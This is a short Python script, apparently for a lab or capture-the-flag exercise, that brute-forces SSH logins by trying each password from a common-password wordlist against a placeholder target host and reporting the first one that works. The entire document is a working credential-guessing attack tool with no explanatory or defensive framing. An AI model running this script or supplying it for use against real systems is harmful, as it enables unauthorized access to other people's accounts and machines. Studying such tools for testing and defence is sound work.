from pwn import *
import paramiko

host = "TARGET_IP_OR_HOSTNAME"  # Replace with the target IP/hostname
username = "notroot"  # Replace with the target username
password_file = "ssh-common-passwords.txt"  # Path to the password list
timeout = 1  # Timeout for each connection attempt
attempts = 0  # Counter for attempts

# Open the password file
try:
    with open(password_file, "r") as password_list:
        for password in password_list:
            password = password.strip("\n")
            attempts += 1
            print(f"[{attempts}] Attempting password: '{password}'")

            try:
                # Attempt SSH connection
                response = ssh(host=host, user=username, password=password, timeout=timeout)
                if response.connected():
                    print(f"[✔] Valid password found: '{password}'")
                    response.close()
                    break
            except paramiko.ssh_exception.AuthenticationException:
                # Invalid password
                print("[X] Invalid password.")
            except paramiko.SSHException as e:
                # Handle potential connection errors
                print(f"[!] SSH Exception encountered: {str(e)}")
            except Exception as e:
                # Catch-all for any other exceptions
                print(f"[!] Unexpected error: {str(e)}")
                break

except FileNotFoundError:
    print(f"[!] Password file '{password_file}' not found.")
except KeyboardInterrupt:
    print("\n[!] Brute force attack interrupted by user.")
